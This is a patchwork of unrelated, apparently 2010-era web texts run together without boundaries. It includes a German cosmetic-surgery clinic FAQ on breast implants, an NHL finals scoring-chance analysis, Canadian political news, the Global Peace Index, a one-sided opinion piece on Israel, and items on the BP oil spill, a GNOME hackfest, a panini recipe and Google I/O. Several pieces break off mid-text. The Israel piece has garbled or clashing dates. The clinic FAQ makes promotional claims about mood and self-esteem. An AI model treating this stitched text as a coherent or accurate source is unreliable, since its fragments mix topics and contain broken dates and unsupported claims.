Wo werden die notwendigen Hautschnitte bei einer Brustvergrößerung durchgeführt ?
Damit sichtbare Narben nach einer Brustvergrösserung weitgehend vermieden werden , sind Schnitte entweder in der Achselhöhle , in der Brustumschlagsfalte oder am Rand des Warzenhofes notwendigen .
Durch den optimal gewählten Hautschnitt kann das Brustimplantat entweder unter dem Brustmuskel oder unter das Drüsengewebe eingebracht werden .
Welches Brustimplantat ist das Beste für mich ?
Die ideale Lage des Implantates ist von mehreren Faktoren abhängig und wird im Beratungsgespräch genauestens erklärt .
Die anatomischen Faktoren sowie Ihre persönlichen Wünsche werden bei der Auswahl der Größe und der Form der Brustimplantate berücksichtigt .
Auch die bevorzugte Position ( über oder unter dem Brustmuskel ) hängt von der bereits vorhandenen Brustdrüse ab .
Unsere verwendeten Brustimplantate sind mit auslaufsicherem kohäsiven Silikongel gefüllt , die Oberfläche ist zur Vermeidung einer Kapselfibrose aufgeraut ( texturiert ) .

Anatomisch geformte und runde Implantate sind in allen vorstellbaren Größen verfügbar .
Wir verwenden ausnahmslos Implantate der weltweit führenden Hersteller ( zB. Mentor und Eurosilicone ) .
Gibt es ein erhöhtes Risiko bei einer operativen Brustvergrößerung ?
Jedes Jahr entscheiden sich tausende Frauen für eine operative Brustvergrösserung .
Selten können Wundinfektionen nach einer Brustvergrößerung auftreten , die zu einer verlangsamten Wundheilung führen und mit Antibiotika und anderen geeigneten Medikamenten behandelt werden müssen .
Wichtig zu wissen :
Auch bei einer normalen Wundheilung können die Narben anfangs für eine kurze Zeit verhärtet und gerötet sein .
Durch geeignete medizinische Pflegeprodukte werden die Narben weicher und verblassen im Laufe der Zeit erfolgreich .
Nach einer durchgeführtrn Brustvergrösserung OP können eventuell anfänglich Schmerzen auftreten , die sich mit einfachen Schmerzmitteln gut behandeln lassen und nach spätestens 3 - 4 Tagen wieder weg sein sollten .
Um jedes Brustimplantat bildet der Körper eine Kapsel , dabei ist ein Schrumpfen ist in seltenen Fällen möglich .
Eine ausgeprägte Kapselfibrose die einen chirurgischen Eingriff erfordert , liegt bei etwa niedrigen 2 % .
Ist das Ergebnis der Brustvergrösserung für immer ?
Die operative Brustvergrösserung wird das Volumen Ihrer Brust vergrößern und sicher auch die Brustform enorm verbessern .
Wie bei vielen Frauen die eine Brustvergrösserung OP durchführen haben lassen , werden auchSie wahrscheinlich eine Steigerung Ihres Selbstbewusstseins bemerken .
Auch von einer Stabilisierung der Gemütslage ist auszugehen .
Das Ergebnis einer Brustvergrösserung ist auf jeden Fall viele Jahre lang anhaltend .

With news pouring in that the Blackhawks have cap problems that are even worse than expected , it 's a darn good thing those boys came through and won the Cup now .
This new NHL is a bit of an odd duck as your best chance to win it all seems to come before rather than during the prime of your most talented players .
As Tyler mentioned a few days ago , let 's hope the Oilers are taking notes .
During the regular season the Blackhawks were clearly the better of the two finalists but that considerable gap was n't obvious to anyone who had n't followed both teams closely during the season .
Indeed , though there were times when the Hawks looked dominant , there were also such times for the Flyers and , on the whole , the teams were very evenly matched .
Well , except in goal where Antti Niemi allowed less than three goals only once ... and was clearly the better netminder .
Crazy stuff .

For those who'd like a definition : a scoring chance is defined as a clear play directed toward the opposing net from a dangerous scoring area - loosely defined as the top of the circle in and inside the faceoff dots , though sometimes slightly more generous than that depending on the amount of immediately - preceding puck movement or screens in front of the net .
Blocked shots are generally not included but missed shots are .
A player is awarded a scoring chance anytime he is on the ice and someone from either team has a chance to score .
He is awarded a " chance for " if someone on his team has a chance to score and a " chance against " if the opposing team has a chance to score .
And , of course , a big thanks to Vic Ferrari for making the whole damn thing possible with his awesome scripts .
I wanted to start by looking at special teams since that 's where the Flyers have the bulk of their advantage .
Coming into the series I thought that special teams would be a big advantage for Chicago and so having it go so far in the other direction was a big surprise .
I thought that the Hawks advantage would mostly come through having more opportunities but that just did n't happen .
In fact , the Flyers ended the series having played 36:17 on the power play compared to only 30:06 for the Hawks .
On top of having more time the Flyers were also more efficient .
For every 2:00 of power play time they generated a chance differential of +1.76 whereas the Blackhawks generated a differential of only + 1.33 for every two minutes .
Both more opportunities and better efficiency is a good combination .
Turning our attention to even strength play , the Hawks did have an advantage at even strength in the first two periods but then pissed it all away and more in the third period and overtime .
Some of that has to do with having the lead more often in the third and taking a defensive posture but even when the score tied they were outchanced 12 - 9 so at least a part of that shift seems to be for reasons other than playing to the score .
Looking at the game - by - game totals , you 'll notice that the Flyers were even or better at even strength in every game but one .
You would think keeping things even or better at even strength combined with a substantial advantage on special teams would have been enough to win but when bad luck and bad goaltending get together they 're an awfully powerful force .
Chris Pronger is an absolute beast .
He was +3 - 13 in EV scoring chances in Game Five and still had over 55 % for the series as a whole .
If we take out those Game Five results his SC percentage soars to 64.5 % which is amazingly good .
He was also an entertaining villain , much moreso than I ever remember before and for that the league probably owes him .
The NHL does n't often have a lot of personality but that sure was n't a problem in the Finals with Pronger standing above the rest .
The " other " top Flyer defender , Kimmo Timonen , also had an amazing series .
The gap in performance between Timonen and the other non-Pronger defenders is probably best seen in his numbers compared to that of his regular partner , Braydon Coburn .
Timonen actually played fewer EV minutes than Coburn but the two were together for about 67 % of Coburn 's EV TOI ( and 79 % of Timonen's ) .
When the two were together the Flyers were +20 - 16 for scoring chances ( 55.6 % ) .
Timonen with other partners ended up +15 - 7 ( 68.2 % ) , while Coburn was +5 - 15 ( 25.0 % ) .
Now , it 's quite possible that Timonen played in offensive situations when the two were apart and Coburn in defensive ones but even if that is the case , that is just an enormous difference .
With both Pronger and Timonen on the same team , it seems to me the Flyers have some amazing pump and dump opportunities over the next couple of seasons .
The forwards are an interesting study .
Both Briere and Richards had lines that were outchancing at even strength and yet both of them were slightly outshot .
The goal differential ?
Yeah , that was n't the same .
Check out this chart of even strength shots and goals ( empty - netters excluded ) :
That 's a pretty stark contrast !
It 's a real shame for the guys at the bottom that the percentages are what usually drive playoff narratives because these guys are getting their asses handed to them in that department .
Jeff Carter especially should be lauded for what he was able to accomplish playing through an injury , but sometimes it 's difficult to see through a - 5 , a - 6 or , God forbid , a - 8 .
At the other end you 've got three guys outscoring so far above their abilities it is to laugh .
I know it 's hard to part with playoff heroes but this run could really net the Flyers a bounty if they can convince themselves to trade Ville Leino to someone who believes that he's the real deal and move Danny Briere - though he has a NMC - to a GM who feels his playoff performance shows that he 's worth his contract .
The Hawks numbers are n't all that flattering .
Dave Bolland 's line was the main beneficiary of Yahweh 's wrath against Carter , Gagne and Richards with flat - out incredible percentages at both ends of the rink .
Given their cap crunch , I 'd be really tempted to move Dave Bolland on out if there are general mangers who believe in him as much as the general public .
If so , he could be moved for real value without much loss in performance .
After all , it can't be that hard to find someone who gets the crap kicked out of him while taking on defensive assignments , that is unless his magic is real .
Unfortunately , his magic is probably about as real as that of Benny Hinn ( I can see Bruce sizzling on the floor now , " Bolland is real ! " ) .
Can we nickname Bolland Benny Hinn ?
Two guys who should absolutely stick around are Marian Hossa and Patrick Sharp .
When they were on a line together , the two of them were fantastic , both in this series and before .
Once they were separated , Hossa did a wonderful job with Jonathan Toews while Sharp formed a fantastic line with Patrick Kane and Andrew Ladd .
If I were in Stan Bowman 's shoes , it 's those five forwards that I would be trying my best to keep together .
Obviously they 'll be keeping more than five of their current guys , but those five form a very nice core .
On defence , the Hawks had a tremendous top pairing and that 's about it .
Niklas Hjalmarsson , Brian Campbell and Brent Sopel all had some nice moments but for the most part were less than what was needed .
Hjalmarsson obviously played a much larger role than what was expected of him so he deserves some credit there but he looked overmatched at times and made some really bad gaffes , especially in Game Four .
Sopel had a similarly larger role and did n't struggle quite so badly , but he 's probably a guy you 'd like to have fifth or sixth on the depth chart and the Hawks really can't afford that right now .
And then there 's Campbell .
He looks good by the scoring chances but he was used almost exclusively in the offensive zone so , in my opinion , you 'd hope for a bit more .
Finally , it was a great series to watch and a thoroughly enjoyable playoffs overall .
I hope Oiler fans watched it because , cheering for a team like that , I think you need good hockey to keep you going .
Next up is the draft and the UFA derby .
Unfortunately for the Hawks ( and fortunately for the rest of the league ! ) , the off - season could be almost as exciting .
Senior insiders with the federal Liberals and New Democrats have been holding secret talks about the possibility of merging their parties to form a new entity to take on the Conservatives , CBC News has learned .
Many Liberal insiders confirmed that discussions between the two parties are not just focused on forming a coalition after an election or co-operation before one , but the creation of a new party .
The new party would possibly be named the Liberal Democrats and there has been tentative talk about what a shared platform would look like and an understanding that a race would be required to choose a new leader .
" Serious people are involved in discussions at a serious level , " Warren Kinsella , a former adviser to former prime minister Jean Chrétien , told CBC News .
Warren Kinsella , former adviser to Jean Chrétien , says Liberal and the NDP insiders are discussing the possibility of forming a new party .
( ( CBC ) )
Kinsella would not say who was involved in the discussions , saying he did not want to " deter " people .
He added that with the Liberals polling at around 25 per cent support , a merger necessitates consideration .
" The reality is that we are in a bad position , " Kinsella said .
" We do n't want to see the Liberal Party of Canada disappear and I 'm sure there are a lot of New Democrats who are getting fed up with their fate . "
Recently , there has been talk about the possibility of a coalition between the Liberals and the NDP .
" If it is doable , let 's do it , " Chrétien recently told CBC's Power & Politics .
Liberal MP
Bob Rae wrote a blog about a coalition he was part of in Ontario 25 years ago as leader of the provincial NDP , saying the " government worked effectively and efficiently . "
Former Saskatchewan NDP premier Roy Romanow has also said the idea is worth considering .
Last week , a poll suggested that a coalition led by NDP Leader Jack Layton would beat Prime Minister Stephen Harper 's Conservatives while one led by Liberal Leader Michael Ignatieff would lose .
In an interview with The Canadian Press over the weekend , Ignatieff said he would be prepared to lead a coalition after the election , but appeared to rule out any agreement to form a new party with the NDP .
" The talk of merger is absurd , " Ignatieff said
Kinsella said that the idea hinges on Ignatieff and NDP Leader Jack Layton getting together and having some " measure of agreement on how to move forward . "
Kinsella admitted an agreement to scrap the Liberal party and create a new one would upset some members .
" I can't see it being done without some bruises or some bruised feelings , " he said .
Liberal insider David Herle says he 's ' outraged ' over the idea of abolishing the Liberal Party of Canada to form a new party with the NDP .
( CBC ) But David Herle , another Liberal insider who ran two election campaigns for former prime minister Paul Martin , slammed the notion that some Liberals would be willing to kill off the Liberal Party of Canada .
" I find it an outrage , frankly .
I think it 's astonishing that people have leaped to such a broad conclusion and that anybody is willing to throw over the history and role that this party has and continue [s ] to play in the country .
I 'm appalled by it , " he said .
Herle agreed that the talks have been serious but is confident the ensuing backlash will kill the idea .
America , land of peace ?
Forget about it .
The United States is just the 85th most peaceful nation on earth , according to the fourth annual Global Peace Index ( GPI ) , a statistical ranking based on a spectrum of 23 qualitative and quantitative indicators — from political stability and military expenditures to gun sales , violent crime and “ respect for human rights . ”
The 85th position does not even rank the U.S. in the upper half in the 149 - nation list , which was released Tuesday .
But some of the countries ranked ahead of the U.S. may raise a few eyebrows : China , Cuba , Libya , Sierra Leone , Ghana , Chile and the United Arab Emirates are among them , based on their relative peacefulness within their own borders and with neighbors .
At its most basic , the GPI simply defines peace as “ an absence of violence . ”
The top 10 ?
For the second year in a row , New Zealand is in first place , followed by Iceland , Japan , Austria , Norway , Ireland , Denmark , Luxembourg , Finland and Sweden .
The bottom 10 countries are North Korea , Congo , Chad , Georgia , Russia , Israel , Pakistan , Sudan , Afghanistan , Somalia and , in very last place , Iraq .
Among our Western allies , Canada is ranked 14th ; Germany , 16th ; Spain , 25th ; the United Kingdom , 31st ; France , 32nd ; and Italy in the 40th spot .
“ The Global Peace Index uses the definition that the absence of violence is the definition of peace .
That ’s something that most everyone can agree on , ” GPI founder and Australian technology entrepreneur and philanthropist Steven Killelea told The Washington Times .
“ We ’re not out to make moral or value judgments here .
We ’re out to measure the peacefulness of nations , and determine what cultural attributes and other internal structures create a peaceful society , ” he said .
Australia , incidentally , was ranked 19th on the GPI list .
Mr. Killelea is keenly interested in the economics of peace and insists that peace is , essentially , cheaper .
“ I am a simple businessman who asked , ‘ What do we know about peace ? ’
And what I found was that the concept of ‘ peace ’ was changing all the time , and more importantly , we do n’t know a lot about the economics of peace .
But I will say this :
It ’s a lot cheaper to build structures of peace in a society , ” he said .
“ Look at the cost of terrorism on the U.S. , for example , on the airlines , on the extra loss of time going through security , multiplied over many passengers .
It all adds up , ” Mr. Killelea added .
“ Or consider that regardless of how you feel about the Iraq war , it is still a huge drain on the U.S. economy . ”
Still , the determination of peacefulness is a complicated process .
A six - member board of international analysts and academics determined the parameters of the measurements , which also tallied the prison populations in each nation , the likelihood of violent demonstrations , “ perceptions of criminality in society , ” the potential for terrorist acts and the “ ease of access to small arms and light weapons , ” among other things .
The GPI is also based on a secondary set of 33 indicators that plumb the finer points of the nations in question , gauging the quality of democracy , the strength of a nation ’s institutions and political process , plus their religious , educational and cultural dynamics .
Mr. Killelea also has founded the Institute for Economics and Peace , a “ global ” think tank with a mission to parse out the relationship among economic development , business and peace .
“ We ’ve come up with a reasonable definition of peace , and one that can be measured in a numerical way .
This idea has captured the imaginations of governments , researchers , philanthropists , ” said Clyde McConaghy , president of the group .
The researchers ultimately hope to use all their sets of data to determine what “ drivers ” that may influence “ the creation and nurturance ” of peaceful societies .

Israel has been pursuing its cry -wolf policy since its inception .
Successive Israeliregimes have followed the same tactic of presenting their own nation as the victim of aggression .
All the major news firms and corporations have taken the same line .
“ Israel as victim ’ , has filled the headlines .
These days there are more examples than ever .
Israel has been justifying its attacks and deadly wars against Palestinians and Arabs in terms of their right to self - defense .
Here are some of the messages we hear from the Israelis over and over again :
“ We are encircled by the Arabs . ”
“ We are encircled by terrorists . ”
“ We are living in the tough area of the Middle East . ”
“ We are fighting for our existence . ”
“ Our nukes are for the purpose of protection . ”
“ The Gaza siege is a legal means to stop rocket attack . ”
“ Settlements are a legal means to protect our Jewish Identity . ”
Any audience worldwide hearing only this account might believe what they hear .
It is normal for any body and everybody to seek safety and security as a basic need .
People worldwide and specifically in America , which is the foremost supporter of Israel , will be convinced .
For as long as these fictions are promulgated along media wires and echoed by reputable institutions , Israel will continue to defy international law and humanitarian charters .
More human rights will be violated .
In the 1967 war , Israel captured hundreds of Egyptian soldiers .
According to international law , Israel should have protected them before taking them to court or banishing them to prison .
But Israel massacred them in the desert .
We never heard of any subsequent
investigation by the international community .
Whose rights of self defense were infringed on that occasion ?
Massacres , like Sabra and Shatila , have been perpetrated in Lebanon .
The Israeli version of this story is that , “ we invaded Lebanon to kick out Palestinian fighters .
Or to protect our borders .
It ’s all about self defense . ”
But disproportionate force was used by Israel :
thousands of Palestinians / Lebanese were killed in such massacres .
In 1996 and 2006 in its wars on Lebanon , Israel bombarded the UN compounds and killed hundreds of civilians and UN forces .
All this was on the grounds of self defense .
The siege of Gaza and the one - sided war was part of Israeli self defense strategy .
Very limited attacks have been launched against Israel but the Israeli response has always been deadly .
The useless rockets of Hamas have been used as a pretext by Israel to launch its
attacks .
They are the reason given for imposing the siege .
However , the facts on the ground are different .
Israeli self - defense
The legal dictionary of Gerald N. Hill and Kathleen T. Hill ( 1981 -2005 by ) defines self - defense as , ” self - defense n. the use of reasonable force to protect oneself or members of the family from bodily harm from the attack of an aggressor , if the defender has reason to believe he / she / they is / are in danger .
Self - defense is a common defense by a person accused of assault , battery , or homicide .
The force used in self - defense may be sufficient for protection from apparent harm ( not just an empty verbal threat ) or to halt any danger from attack , but can not be an excuse to continue the attack or use excessive force . ”
You only have to look at the last six decades .
Before its establishment ; Israel ethnically cleansed more than 800,000 Palestinians .
More than 530 villages were viciously destroyed before it even existed .
Wars then were launched against Syria , Egypt , Lebanon and Jordan .
Attacks and military operations of Israel in the name of self defense reached Tunisia , Iraq , Algeria and Morocco .
Add to that , a hundred or more operations that took place across Asia , Africa , Europe and North America .
From 1967 to 2008 more than 800.000 Palestinians were imprisoned by Israel .
From 29/9/200 to 31/12/2008 more than 5901 Palestinians were killed .
The same period witnessed up to 40,000 injured people .
On the other side , around 1000 Israeli were killed .
There is a huge and vast gap between the numbers .
Additionally , 1440 Palestinians were killed in Gaza .
The ratio is around 8 Palestinians killed for each Israeli .
Rockets Issue and Self - defense
The official website of the Israeli Foreign Affairs ministry states that 1,750 rockets and 1,528 mortar bombs fired from the Gaza Strip struck southern Israel in 2008 .
This is understandably shocking for anyone who reads this .
The term rocket or mortar or missile induces fear in any ordinary onlooker .
Israel uses such statistics and numbers to deflect the attention of the international mainstream media and those who consume it .
If we suppose Israel is right about this , then why do n’t we see Israel giving more details about these rockets ?
Why
does Israel not show the pictures of the victims of these rockets ?
Why do n’t we see the damaged cities , town , and village ?
Clearly these rockets are ineffective and useless .
According to the BBC , since 2001 , when the rockets were first fired , more than 8,600 have hit southern Israel , nearly 6,000 of them since Israel withdrew from Gaza in August 2005 .
The rockets have killed 28 people and
injured hundreds more .
This is 28 people killed and hundreds injured too many .
But note that there is a huge gap between the number of victims and the number of rockets .
If this leads us to any conclusion , it must be that these rockets are primitive , inexact and ineffective .
The rockets are just
another scapegoat that Israel uses to justify its ongoing attacks against Palestinian civilians .
Some Palestinian factions have now stopped firing these rockets as Hamas did , from June to December 2009 .
What happened ?
A full - scale war was launched in late 2009 that took the lives of more than 1440 Palestinians , mostly civilians .
The arithmetic is like this : 28
Israelis killed by rocket attacks in nine years while 1440 Palestinians were killed in only 3 weeks in the last war on Gaza .
There is no way to compare the two sides .
The self defense argument deployed by Israel should be renamed its policy of aggression .
Self defense empowers victims to use sufficient power to defend themselves .
But from the Israeli government we only see excessive force used against civilians .

As many as 40,000 barrels ( 1.7 m gallons ) of oil a day may have been gushing out from a blown - out Gulf of Mexico well , doubling many estimates .
The US Geological Survey says that flow rate could have been reached a capping device was put on the well on 3 June
BP ’s chairman has been invited to meet President Barack Obama next week , as concerns grow over the effect of the spill on US - UK ties .
UK Prime Minister David Cameron is to speak with Mr Obama at the weekend .
Oil has been leaking into the Gulf since the Deepwater Horizon rig exploded on 20 April and sank off the coast of the US state of Louisiana , killing 11 workers .
BP said the device placed on the well collected 15,800 barrels of oil on Wednesday – slightly up on the 15,010 barrels collected in the previous 24 - hour period .
Some GNOME developers have gathered in Boston for for a Python GNOME hackfest that is hosted by the One Laptop Per Child ( OLPC ) project .
The primary goals behind the hackfest include establishing a strategy for delivering Python 3.0 compatibility for the GNOME platform and advancing the Python GObject introspection project .
The Gtk+ toolkit , which provides the underlying widget system of the GNOME desktop environment , is an important part of the desktop Linux ecosystem .
Although the toolkit itself is built with C , it can also be used with other programming languages — including Python , Ruby , JavaScript , C# , Java , and Scheme .
Python is widely used by Gtk+ application developers and is important to the GNOME community .
OLPC , the host of the hackfest , uses Python in conjunction with Gtk+ for its Sugar environment — the core user experience and activity collection that is shipped on its XO laptops .
How the PyGtk language bindings work
The ability to develop Gtk+ applications with alternate programming languages is facilitated by bindings — frameworks that expose the toolkit and map its functionality to the object model and programming idioms of the target language so that it can be used seamlessly like any other programming library .
Gtk+ bindings are generally created and maintained individually for each programming language .
The same is true of other libraries that are part of the GNOME platform in addition to Gtk+ itself .
For example , there are bindings for Pango , WebKit , GConf , Cairo , Clutter , GIO , and others .
These bindings are a very important part of the GNOME platform .
It 's useful to have support for high - level languages that are conducive to rapid development because they lower the barriers to entry by enabling third - party developers to build software for GNOME without having to use C .
The downside , however , is that maintaining the bindings can be somewhat complicated and requires a lot of work .
The existing Python bindings for Gtk+ and other GNOME libraries that use the GLib object model ( GObject ) largely consist of object and method definitions that are written in a lisp - like syntax .
These are partly generated from the C header files of the underlying library .
In addition to definition files , the Python bindings also have " override " files that include a lot of glue code to facilitate a clean wrapping .
A code generator tool processes the definition and override files in order to build the actual Python extension module .
Although some parts of the process are easy to automate , there is still quite a bit of dirty work that has to be done by hand .
When you consider the fact that this work has to be repeated using different mechanisms for each programming language , you can see that offering broad programming language support for GNOME libraries is a pretty burdensome undertaking .
Building better Python bindings with GObject introspection
Fortunately , there is a compelling project that simplifies the development of bindings for GObject - based libraries and reduces the amount of maintenance that is required to keep the bindings in working order .
The underlying technology is called GObject introspection .
Instead of maintaining separate sets of type definitions with different mechanisms for each programming language , GObject introspection offers a more consistent and standardized approach .
Annotations and type info are extracted from the C code and used to generate XML files that describe the structure of the library .
These XML files serve as a centralized repository of type metadata that can be used by all of the language bindings .
The annotations in the C code are written in comments using a standard format that is both human - readable and easily parsed by the GObject introspection tools .
For a high - level visual overview of how GObject introspection works , you can refer to the diagram on the GNOME Live wiki .
The GObject introspection project has been around for a few years and has achieved a level of maturity that makes it broadly suitable for adoption by language bindings .
It is already used successfully in that capacity by Vala ( a programming language modeled after C# with a compiler that statically generates C code ) and Gjs ( a SpiderMonkey - based JavaScript runtime for desktop application development ) .
As the PyGtk bindings are about to get a major overhaul to deliver compatibility with Python 3.0 , the developers are taking the opportunity to also begin migrating the bindings to use GObject introspection .
Both of those efforts are getting a big boost at the GNOME Python hackfest .
Moving forward with a hackfest
Developer John Palmieri concisely described the plan for the transition in a blog entry that he wrote about the first day of the event .
He says that the Python GObject introspection ( PyGI ) framework will be developed alongside the existing conventional PyGtk bindings .
PyGI will initially only be used to wrap the non-overridden functions , but will eventually replace PyGtk entirely .
Colin Walters elaborated on how the hybrid model will work in his own blog entry about the hackfest .
" In the combined architecture , the API people are used to from PyGTK is preserved , however we begin to ' hollow out ' the core so that for more of the simple functions that are n't overridden , instead of generating a static C blob for them , we look up dynamically through PyGI , " he wrote .
Ensuring minimal disruption to the existing APIs during the transition is obviously a high priority .
It 's important to avoid breaking the large number of third - party applications that currently depend on the PyGtk bindings .
Walters compares the transition to " performing engine maintenance while the car is running . "
One of the most significant breakthroughs to emerge from the hackfest is a working implementation of callback support for PyGI .
The original callback implementation patch was written last year by Zach Goldberg and was reviewed by PyGI developer Simon van der Linen .
Goldberg and Walters substantially reworked it during the hackfest and got it merged on Saturday .
The developers also appear to have made good progress on the Python 3.0 support .
The hackfest is clearly delivering tangible improvements to the state of Python support on the GNOME platform .
As they mature , the PyGI - based bindings will make it easier to take advantage of GNOME libraries from Python and will also reduce the amount of work that is needed to maintain the bindings as new features are added to the toolkit .

Peaches & Bacon Panini
I ’m back !
It ’s been a little while since I grilled new panini for you guys .
Or , more accurately , it ’s been a trimester !
We ’re thrilled to be expecting our next little one in January .
I ’m happy to report I ’m finally moving out of the “ total exhaustion ” stage on into “ pretty tired . ”
Now that the thought of food is at least moderately appealing I can finally get back to blogging .
The one thing I ’m craving is fresh California peaches .
Of course , I always look forward to sweet , juicy peaches every summer .
In fact , I just realized that it was about this same time last year that I made my first peach panini .
Instead of grilling them like last time , for my Peaches & Bacon Panini I kept the peaches fresh and paired them with some smoky bacon and stretchy fresh mozzarella .
Ideally I would have grilled them on some crusty ciabatta but since I did n’t find any in the bakery department that day a baguette was a worthy substitute .
I had a hunch that peaches would taste great with bacon and it turned out to be true .
It ’s that sweet - savory thing I just ca n’t get enough of .
I actually think this combo would be great on a pizza ( perhaps with a peach barbecue sauce – hmmm … I may need to try this ! ) .
Peaches & Bacon Panini
Serves 2
INGREDIENTS :
1 - 2 large yellow peaches , pitted and sliced
4 slices bacon , fully cooked
Fresh mozzarella , thinly sliced ( as much as you like )
French baguette , sliced crosswise into 5 ″ sections OR ciabatta rolls ( I would not recommend sliced breads )
DIRECTIONS :
Preheat the panini grill to medium - high heat ( 375 °F ) .
For each sandwich : Halve the bread lengthwise .
In between the halves , layer on the cheese , two slices of bacon and as many peaches as will fit neatly inside the bread .
Grill 4 - 5 minutes until the cheese is melted and the bread is toasted .
Serve immediately and enjoy !

I have to say , this made me smile .
And even laugh .
True enough , Hubble got me .
I can't even complain that it's the Bubble Nebula , not galaxy .
Even I 'm not that picky .
During the opening keynote at the Google I/O conference this morning in San Francisco , the search giant unveiled new Web technologies and reaffirmed its commitment to open standards .
Vic Gundotra , Google 's VP of engineering , started the keynote by highlighting the waning relevance of desktop applications and discussing the significance of software 's ascent into the cloud .
The most important applications today are Web apps , he said .
Although the Web has transformed the way that software is developed , deployed , and consumed , it has introduced new challenges that have to be overcome before it can fulfill its potential .
The Web is growing up , Gundotra remarked , but the diverse ecosystem of Internet stakeholders must work together to ensure that it continues to advance .
" The Web is the most important platform of our generation , " Gundotra told the crowd .
" Our job as a community [ is ] to move the Web forward . "
Sundar Pichai , Google VP of product management , discussed the growing importance of the Web as an application platform .
HTML5 is gaining traction swiftly , he said , and is poised to bring a multitude of rich new capabilities to the Web .
Pichai showed graphs that quantified the increasing support for HTML5 features in mainstream browsers , including Google 's own Chrome .
Web APIs for multimedia , filesystem interaction , geolocation , and support for hardware accelerated rendering have arrived , bringing the promise of a new generation of more sophisticated Web applications .
To illustrate some of the opportunities that are created by HTML5 , Google demonstrated several key emerging standards that are used in the company 's own popular Web applications .
For example , one demo showed how users can attach a file to a Gmail message using drag - and - drop .
Web video
One of the most significant new features introduced in HTML5 is native support for embedding videos in Web content .
The HTML5 video element , which offers a standards - based alternative to the existing proprietary plugins for video playback , has the potential to make rich media a first - class citizen on the Web .
Unfortunately , the lack of a high - performance royalty - free video codec made it difficult for browser vendors to reach consensus on a standard video format .
Google hopes to end the impasse and accelerate the adoption of open video on the Web .
During the Google I/ O keynote , Google revealed that it will be opening up the VP8 codec and making the underlying intellectual property available under royalty - free terms so VP8 can become a truly open standard for Internet video .
The search giant has launched a project called WebM , which brings together the VP8 video codec and the royalty - free Ogg Vorbis audio codec .
The company is collaborating with many different partners to ensure that WebM becomes ubiquitous .
Mozilla and Opera have both enthusiastically embraced the initiative and have already experimentally implemented support in their own Web browsers .
Google invited Mozilla 's Mike Shaver to demonstrate WebM working in a Firefox nightly build during the keynote .
He showed how HTML5 video can be used in interactive websites alongside SVG and other kinds of rich content .
His demo reflected the growing suitability of native Web standards for handling the full spectrum of animation , media , and interactivity that users want on the Web .
Although standards - based Web technology was a prominent theme of the keynote , Google also affirmed its commitment to supporting plugins , such as its own Native Client technology and Adobe 's Flash player .
The company stressed the importance of plugins for enabling game development , too .
For example , one demo showed a 3D LEGO Star Wars game that was implemented in a port of the Unity engine on top of Native Client .
Web app store and catching the Wave
To improve the discoverability of Web applications , Google is launching a Web store that will operate a lot like the Android marketplace .
Users will be able to find Web applications through the store and add Web application shortcuts to the Chrome new tab screen .
The store will be a crucial part of Chrome OS , Google 's upcoming browser - centric operating system that is built on top of the Linux platform .
The Web store will also make it possible for developers to sell Web applications through an integrated purchasing system .
Google 's
Wave collaboration platform also got a boost this morning .
Google is opening up
Wave to everyone , eliminating the need for invitations .
The company is also going to roll out Wave in Google Apps , making it easy for companies to run a hosted Wave instance on their own domains .
New APIs are being made available that will simplify client application development , particularly for mobile environments .
When Google launched the private Wave beta last year , the company opened a considerable portion of the source code for the underlying collaboration engine and protocol .
The goal was to ensure that third - party vendors would be able to create interoperable server software .
Several companies , including SAP and Novell , have been able to bake Wave federation compatibility into their own collaboration software .
In order to make it easier for third - party developers to build Web interfaces for Wave server software , Google is opening the source code of its interactive Wave editor .
The first day of Google I /O is off to a great start .
Google has paved the way for a revolution in open Internet video and is taking important steps to strengthen the Web as an application platform .
WASHINGTON  The Supreme Court on Thursday significantly narrowed the scope of a law often used by federal prosecutors in corruption cases and called into question the fraud convictions of Jeffrey K. Skilling , a former chief executive of Enron , and Conrad M. Black , a newspaper executive convicted of defrauding his media company .
The justices were unanimous in calling a broad interpretation of the law , which makes it a crime “ to deprive another of the intangible right of honest services , ” unconstitutionally vague .
The decision will have implications for many other cases , including those of former Gov. Rod R. Blagojevich of Illinois , who is on trial on charges of violating the law in Chicago , and Joseph L. Bruno , a prominent former New York politician , who was recently convicted of violating the law .
Many lower court judges and scholars have called the law hopelessly vague , saying it could apply to conduct as routine as calling in sick to go to a baseball game .
The vagueness of the law , these critics said , gives potential defendants insufficient notice of what is a crime and prosecutors too much discretion in deciding whom to charge .
Liberal Democrat Leader Nick Clegg has said the political party with the most seats has the first right to seek to form a government .
The Conservatives have won the largest share of the vote in the general election , but not enough to secure an overall majority .
Speaking to reporters , Mr Clegg said the election campaign had made it ' abundantly clear ' the electoral system was ' broken ' .
From wrestler to economist ( Image : Jos Schmid )

FROM outside economist Ernst Fehr ’s office at the University of Zurich in Switzerland you would have no idea that he had been tipped to win a Nobel economics prize .
For one thing , the name on the door looks as if it has been dashed off on the cheapest of departmental printers .
But Fehr himself seems to fit the bill .

Google Android ( s goog ) handsets with front - facing cameras can now be controlled using simple hand gestures , courtesy of eyeSight Mobile Technologies .
The privately held Israeli company uses a phone ’s camera to monitor for gestures , which are then software - interpreted into commands such as map zooming , digital audio playback or phone call receipt .
eyeSight is providing its solution to Android device manufacturers with the expectation that — like the recently launched Android - powered HTC EVO , which is setting sales records for Sprint ( s s ) — future handsets will also sport a front - facing camera .
As Itay Katz , eyeSight ’s founder and CEO , explains in a release : “ Users are looking for ways to ease , improve and enjoy their day - to - day interaction with their mobile phone , ideally aiming to gain effortless control of the device ’s applications and functions , which is where eyeSight ’s solution comes to place . ”
Google ( s goog ) must see the same potential :
It recently spent an estimated $ 35 - $ 40 million on BumpTop , maker of a 3 - D natural user interface that could find its way to Android or Google ’s Chrome OS environment .
The eyeSight product reminds me of a conversation I recently had with my 12 - year - old son after watching “ Bicentennial Man , ” a movie about an android that wants to become human .
I asked my son if he thought we would have natural - acting robots in his lifetime , and he said no , because the technology for robots to use senses like a human does n’t exist for consumers .
That launched a long discussion on how device cameras can be used as “ eyes ” — just as eyeSight is doing — and how microphones can be “ ears . ”
We have robust technology for devices to sense their surroundings , but interpreting what the surroundings mean at the consumer device level is still maturing and cost prohibitive .
For now , waving your hand in front of an eyeSight - enabled Android device will have to do .

Your weapon is choice .
That 's what Alpha Protocol proudly declares in this spy RPG with more than a shade of Mass Effect about it .
Developed by the fine folk at Obsidian , Alpha Protocol has been a most promising prospect since it was first revealed , and the mixture of choice - laden RPG with secret agent shenanigans made for quite the irresistible cocktail .
Of course , having good ideas and having a good game are two different concepts that are rarely brought together , which leads us to the all important question -- is Alpha Protocol a choice worth making , or is it less James Bond and more Inspector Clouseau ?
Read on to find out .
